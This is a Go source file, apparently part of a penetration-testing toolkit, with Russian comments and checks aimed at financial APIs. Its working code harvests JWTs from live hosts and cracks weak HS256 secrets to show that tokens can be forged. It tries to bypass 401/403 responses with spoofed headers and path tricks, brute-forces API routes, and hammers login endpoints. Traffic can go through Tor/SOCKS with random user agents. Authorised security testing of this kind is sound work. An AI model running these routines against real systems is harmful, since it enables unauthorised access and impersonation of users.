// Package apisec — проверки, наиболее ценные для финансовых систем, где
// главный вектор атаки это API и авторизация:
//
//   - JWT: alg:none, подбор слабого HMAC-секрета (подделываемые токены),
//     подсказка про RS256->HS256 confusion, отсутствие exp — встроенно,
//     плюс обёртка jwt_tool, если установлен;
//   - обход 401/403 (broken access control): заголовки X-Forwarded-For/
//     X-Original-URL и трюки с путём — встроенно, с проверкой результата;
//   - дискавери API-эндпоинтов через kiterunner (kr), если установлен;
//   - проверка отсутствия rate-limit на /login, /reset-password и т.п.
//     (осознанно активная, выключена по умолчанию, пропускается в passive).
//
// Ядро работает без внешних тулов (свой HTTP-клиент, умеет через Tor/SOCKS).
package apisec

import (
	"context"
	"crypto/hmac"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"io"
	"net/http"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"

	"pentkit/internal/event"
	"pentkit/internal/netx"
	"pentkit/internal/runner"
	"pentkit/internal/store"
)

const (
	reqTO    = 12 * time.Second
	maxHosts = 30
	maxBody  = 256 * 1024
)

var jwtRe = regexp.MustCompile(`eyJ[A-Za-z0-9_-]{8,}\.eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}`)

// weakSecrets — типовые слабые HMAC-секреты JWT (встроенный мини-словарь).
// Подобранный секрет => токены подделываемы: это критическая находка.
var weakSecrets = []string{
	"secret", "secret123", "password", "changeme", "jwt", "jwtsecret", "jwt_secret",
	"key", "private", "admin", "test", "qwerty", "123456", "0000", "default",
	"your-256-bit-secret", "your_jwt_secret", "supersecret", "s3cr3t", "token",
	"HS256", "mysecret", "secretkey", "app_secret", "api_secret", "signing_key",
}

func newClient(rn *runner.Runner) *http.Client {
	if rn.SOCKS != "" {
		return netx.HTTPClient(rn.SOCKS, reqTO, true)
	}
	return defaultClient
}

// ---------- JWT ----------

type jwtHeader struct {
	Alg string `json:"alg"`
	Typ string `json:"typ"`
}

// JWT ищет токены в live-ответах (Set-Cookie/тело) и анализирует их.
func JWT(ctx context.Context, rn *runner.Runner, st *store.Store, ev event.Sink, baseURLs []string) {
	bases := capN(uniqueBases(baseURLs), maxHosts)
	if len(bases) == 0 {
		return
	}
	ev.Logf("  jwt: ищу и анализирую токены на %d хостах...\n", len(bases))
	client := newClient(rn)

	seen := map[string]bool{}
	var mu sync.Mutex
	var wg sync.WaitGroup
	sem := make(chan struct{}, 8)
	hasTool := rn.Has("jwt_tool")

	for _, base := range bases {
		wg.Add(1)
		sem <- struct{}{}
		go func(base string) {
			defer wg.Done()
			defer func() { <-sem }()
			status, hdr, body := get(ctx, client, base)
			if status == 0 {
				return
			}
			raw := strings.Join(hdr["Set-Cookie"], "\n") + "\n" + hdr.Get("Authorization") + "\n" + body
			for _, tok := range jwtRe.FindAllString(raw, -1) {
				mu.Lock()
				dup := seen[tok]
				seen[tok] = true
				mu.Unlock()
				if dup {
					continue
				}
				analyzeJWT(ctx, rn, st, ev, base, tok, hasTool)
			}
		}(base)
	}
	wg.Wait()
}

func analyzeJWT(ctx context.Context, rn *runner.Runner, st *store.Store, ev event.Sink, target, tok string, hasTool bool) {
	parts := strings.Split(tok, ".")
	if len(parts) != 3 {
		return
	}
	hb, err := b64.DecodeString(parts[0])
	if err != nil {
		return
	}
	var h jwtHeader
	if json.Unmarshal(hb, &h) != nil {
		return
	}
	alg := strings.ToLower(strings.TrimSpace(h.Alg))

	// alg:none — сервер, принимающий такой токен, не проверяет подпись вовсе.
	if alg == "none" || alg == "" {
		st.Add(store.Finding{Target: target, Type: store.TypeJWT, Severity: store.SevHigh,
			Title:    "JWT с alg=none — подпись не проверяется",
			Detail:   "подделай payload и выставь alg:none — проверь, принимает ли сервер",
			Evidence: redact(tok), Tool: "jwt", Tags: []string{"jwt", "auth", "requires-review"}})
		ev.Logf("  jwt: alg=none на %s\n", target)
	}

	// HS256 — пробуем подобрать секрет: успех => токены подделываемы (critical).
	if alg == "hs256" {
		if secret := crackHS256(parts[0]+"."+parts[1], parts[2]); secret != "" {
			st.Add(store.Finding{Target: target, Type: store.TypeJWT, Severity: store.SevCritical,
				Title:    "JWT подписан слабым секретом — токены подделываемы",
				Detail:   "секрет подобран: \"" + secret + "\" — можно выпустить токен любого пользователя/роли",
				Evidence: redact(tok), Tool: "jwt", Tags: []string{"jwt", "auth", "forgeable"}})
			ev.Logf("  jwt: ПОДОБРАН секрет (%s) на %s\n", secret, target)
		}
	}

	// RS256 — классическая ошибка RS256->HS256 confusion (нужна ручная проверка).
	if alg == "rs256" || alg == "rs384" || alg == "rs512" {
		st.Add(store.Finding{Target: target, Type: store.TypeJWT, Severity: store.SevInfo,
			Title:    "JWT " + strings.ToUpper(h.Alg) + " — проверь RS256→HS256 confusion",
			Detail:   "если публичный ключ доступен, попробуй переподписать токен как HS256 этим ключом",
			Evidence: redact(tok), Tool: "jwt", Tags: []string{"jwt", "auth", "requires-review"}})
	}

	// payload: отсутствие exp — долгоживущий/невозможно отозвать токен.
	if pb, err := b64.DecodeString(parts[1]); err == nil {
		var claims map[string]any
		if json.Unmarshal(pb, &claims) == nil {
			if _, ok := claims["exp"]; !ok {
				st.Add(store.Finding{Target: target, Type: store.TypeJWT, Severity: store.SevLow,
					Title: "JWT без exp — токен не истекает", Evidence: redact(tok),
					Tool: "jwt", Tags: []string{"jwt", "auth"}})
			}
		}
	}

	if hasTool {
		r := rn.Run(ctx, "jwt_tool", tok)
		for _, line := range r.Lines {
			l := strings.TrimSpace(line)
			low := strings.ToLower(l)
			if strings.Contains(low, "vulnerab") || strings.Contains(low, "weak") || strings.Contains(low, "alg:none") {
				st.Add(store.Finding{Target: target, Type: store.TypeJWT, Severity: store.SevMedium,
					Title: "jwt_tool: " + trim(l, 120), Evidence: redact(tok),
					Tool: "jwt_tool", Tags: []string{"jwt", "auth", "requires-review"}})
			}
		}
	}
}

// crackHS256 возвращает подобранный секрет или "".
func crackHS256(signingInput, sig string) string {
	want, err := b64.DecodeString(sig)
	if err != nil || len(want) == 0 {
		return ""
	}
	for _, s := range weakSecrets {
		m := hmac.New(sha256.New, []byte(s))
		m.Write([]byte(signingInput))
		if hmac.Equal(m.Sum(nil), want) {
			return s
		}
	}
	return ""
}

// ---------- 401/403 bypass ----------

// bypassHeaders — заголовки, которыми часто обходят access control на прокси/ACL.
var bypassHeaders = []map[string]string{
	{"X-Forwarded-For": "127.0.0.1"},
	{"X-Forwarded-For": "127.0.0.1", "X-Forwarded-Host": "127.0.0.1"},
	{"X-Real-IP": "127.0.0.1"},
	{"X-Originating-IP": "127.0.0.1"},
	{"X-Custom-IP-Authorization": "127.0.0.1"},
	{"X-Forwarded-For": "localhost"},
	{"Referer": "127.0.0.1"},
}

// pathTricks — суффиксы/префиксы к пути, проскакивающие некоторые матчеры.
var pathTricks = []string{"/", "/.", "//", "/%2e/", "/./", "?", "#", "/..;/", "%20", "%09", ".json"}

// BypassForbidden берёт URL, вернувшие 401/403, и пробует обойти ограничение.
// Находка только если обход реально даёт 2xx (а не редирект на логин).
func BypassForbidden(ctx context.Context, rn *runner.Runner, st *store.Store, ev event.Sink, forbidden []string) {
	if rn.Passive {
		ev.Logln("  пассивный режим: обход 401/403 пропущен")
		return
	}
	if len(forbidden) == 0 {
		return
	}
	forbidden = capN(forbidden, 40)
	ev.Logf("  bypass: пробую обойти доступ на %d закрытых URL...\n", len(forbidden))
	client := newClient(rn)
	n := 0

	for _, u := range forbidden {
		base, _, _ := get(ctx, client, u)
		if base != 401 && base != 403 {
			continue // уже открыт или недоступен — нечего обходить
		}
		hit := func(how, variant string, st2 int) bool {
			if st2 >= 200 && st2 < 300 {
				st.Add(store.Finding{Target: u, Type: store.TypeBypass, Severity: store.SevHigh,
					Title:    "Обход контроля доступа (" + strconv.Itoa(base) + "→" + strconv.Itoa(st2) + ")",
					Detail:   how + ": " + variant,
					Evidence: "исходный " + strconv.Itoa(base) + ", после обхода " + strconv.Itoa(st2),
					Tool:     "bypass", Tags: []string{"bypass", "access-control", "requires-review"}})
				ev.Logf("  bypass: %s через %s (%s)\n", u, how, variant)
				n++
				return true
			}
			return false
		}
		done := false
		for _, hdrs := range bypassHeaders {
			if done {
				break
			}
			if s := getH(ctx, client, u, hdrs); hit("заголовок", hdrFmt(hdrs), s) {
				done = true
			}
		}
		for _, t := range pathTricks {
			if done {
				break
			}
			if s, _, _ := get(ctx, client, u+t); hit("путь", "+"+t, s) {
				done = true
			}
		}
		// X-Original-URL / X-Rewrite-URL на корень с путём в заголовке.
		if !done {
			if p := pathOf(u); p != "" && p != "/" {
				root := rootOf(u)
				for _, hn := range []string{"X-Original-URL", "X-Rewrite-URL"} {
					if s := getH(ctx, client, root, map[string]string{hn: p}); hit("заголовок", hn+": "+p, s) {
						break
					}
				}
			}
		}
	}
	ev.Logf("  bypass: удачных обходов %d\n", n)
}

// ---------- kiterunner (API discovery) ----------

var krLineRe = regexp.MustCompile(`^(GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS)\s+(\d{3})\b.*\s(https?://\S+)`)

// Kiterunner брутфорсит API-эндпоинты через kr (если установлен).
func Kiterunner(ctx context.Context, rn *runner.Runner, st *store.Store, ev event.Sink, baseURLs []string) {
	if !rn.Has("kr") {
		ev.Logln("  ! kiterunner (kr) не установлен — пропускаю дискавери API (go install .../kr@latest)")
		return
	}
	bases := capN(uniqueBases(baseURLs), 10)
	if len(bases) == 0 {
		return
	}
	for _, base := range bases {
		ev.Logf("  kr: дискавери API на %s ...\n", base)
		args := []string{"scan", base, "-A=apiroutes-220828", "-x", "6", "-j", "40",
			"--fail-status-codes", "400,404,501,502"}
		if rn.Stealthy() {
			args = append(args, "-d", "200ms")
		}
		r := rn.Run(ctx, "kr", args...)
		seen := map[string]bool{}
		for _, line := range r.Lines {
			m := krLineRe.FindStringSubmatch(strings.TrimSpace(line))
			if m == nil {
				continue
			}
			method, code, url := m[1], m[2], m[3]
			if seen[url] {
				continue
			}
			seen[url] = true
			sev := store.SevInfo
			switch {
			case code == "200":
				sev = store.SevLow
			case code == "401" || code == "403":
				sev = store.SevInfo // существует, но закрыт — кандидат для bypass
			case strings.HasPrefix(code, "5"):
				sev = store.SevLow
			}
			st.Add(store.Finding{Target: url, Type: store.TypeAPI, Severity: sev,
				Title: "API-эндпоинт: " + method + " " + code, Tool: "kiterunner",
				Tags: []string{"api", "discovery"}})
		}
	}
}

// ---------- rate-limit на auth-эндпоинтах ----------

var authPathRe = regexp.MustCompile(`(?i)(login|signin|sign-in|auth|token|session|reset|forgot|password|otp|verify|2fa|mfa)`)

const rlAttempts = 12

// AuthRateLimit проверяет отсутствие ограничения частоты на формах входа/сброса.
// Активная проверка: шлёт серию заведомо-ложных запросов с фейковым логином.
// По умолчанию выключена и пропускается в passive — включать осознанно.
func AuthRateLimit(ctx context.Context, rn *runner.Runner, st *store.Store, ev event.Sink, urls []string) {
	if rn.Passive {
		ev.Logln("  пассивный режим: проверка rate-limit пропущена")
		return
	}
	var targets []string
	seen := map[string]bool{}
	for _, u := range urls {
		if authPathRe.MatchString(u) && !seen[u] {
			seen[u] = true
			targets = append(targets, u)
		}
	}
	targets = capN(targets, 8)
	if len(targets) == 0 {
		ev.Logln("  rate-limit: не нашёл auth-эндпоинтов среди URL")
		return
	}
	ev.Logf("  rate-limit: проверяю %d auth-эндпоинтов (фейковый логин)...\n", len(targets))
	client := newClient(rn)

	for _, u := range targets {
		throttled := false
		var lastCode int
		for i := 0; i < rlAttempts; i++ {
			code, _, body := postForm(ctx, client, u,
				"username=pentkit_probe_nonexistent&password=wrongpass_"+strconv.Itoa(i))
			lastCode = code
			if code == 429 || code == 503 || strings.Contains(strings.ToLower(body), "too many") ||
				strings.Contains(strings.ToLower(body), "rate limit") || strings.Contains(strings.ToLower(body), "slow down") {
				throttled = true
				break
			}
			if code == 0 {
				break
			}
		}
		if !throttled && lastCode != 0 {
			st.Add(store.Finding{Target: u, Type: store.TypeAuth, Severity: store.SevMedium,
				Title:    "Нет rate-limit на auth-эндпоинте",
				Detail:   strconv.Itoa(rlAttempts) + " быстрых попыток без блокировки — риск брутфорса/credential stuffing",
				Evidence: "последний ответ: HTTP " + strconv.Itoa(lastCode),
				Tool:     "ratelimit", Tags: []string{"auth", "rate-limit", "requires-review"}})
			ev.Logf("  rate-limit: нет ограничения на %s\n", u)
		}
	}
}

// ---------- HTTP-утилиты ----------

var b64 = base64.RawURLEncoding

func get(ctx context.Context, c *http.Client, u string) (int, http.Header, string) {
	return doReq(ctx, c, http.MethodGet, u, nil, "")
}
func getH(ctx context.Context, c *http.Client, u string, hdrs map[string]string) int {
	s, _, _ := doReq(ctx, c, http.MethodGet, u, hdrs, "")
	return s
}
func postForm(ctx context.Context, c *http.Client, u, body string) (int, http.Header, string) {
	return doReq(ctx, c, http.MethodPost, u, map[string]string{"Content-Type": "application/x-www-form-urlencoded"}, body)
}

func doReq(ctx context.Context, c *http.Client, method, u string, hdrs map[string]string, body string) (int, http.Header, string) {
	cctx, cancel := context.WithTimeout(ctx, reqTO)
	defer cancel()
	var rd io.Reader
	if body != "" {
		rd = strings.NewReader(body)
	}
	req, err := http.NewRequestWithContext(cctx, method, u, rd)
	if err != nil {
		return 0, nil, ""
	}
	req.Header.Set("User-Agent", netx.RandomUA())
	for k, v := range hdrs {
		req.Header.Set(k, v)
	}
	resp, err := c.Do(req)
	if err != nil {
		return 0, nil, ""
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, maxBody))
	return resp.StatusCode, resp.Header, string(b)
}

func hdrFmt(h map[string]string) string {
	var p []string
	for k, v := range h {
		p = append(p, k+": "+v)
	}
	return strings.Join(p, ", ")
}

func uniqueBases(urls []string) []string {
	seen := map[string]bool{}
	var out []string
	for _, u := range urls {
		if r := rootOf(u); r != "" && !seen[r] {
			seen[r] = true
			out = append(out, r)
		}
	}
	return out
}

func rootOf(u string) string {
	i := strings.Index(u, "://")
	if i < 0 {
		return ""
	}
	rest := u[i+3:]
	if j := strings.IndexByte(rest, '/'); j >= 0 {
		rest = rest[:j]
	}
	return u[:i+3] + rest
}

func pathOf(u string) string {
	i := strings.Index(u, "://")
	if i < 0 {
		return ""
	}
	rest := u[i+3:]
	if j := strings.IndexByte(rest, '/'); j >= 0 {
		return rest[j:]
	}
	return "/"
}

func capN(in []string, n int) []string {
	if len(in) > n {
		return in[:n]
	}
	return in
}

func redact(s string) string {
	s = strings.TrimSpace(s)
	if len(s) <= 18 {
		return s
	}
	return s[:12] + "…" + s[len(s)-6:]
}

func trim(s string, n int) string {
	if len(s) > n {
		return s[:n] + "…"
	}
	return s
}

var defaultClient = &http.Client{
	Timeout: reqTO,
	Transport: &http.Transport{
		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
		DisableKeepAlives: true,
	},
	CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse },
}
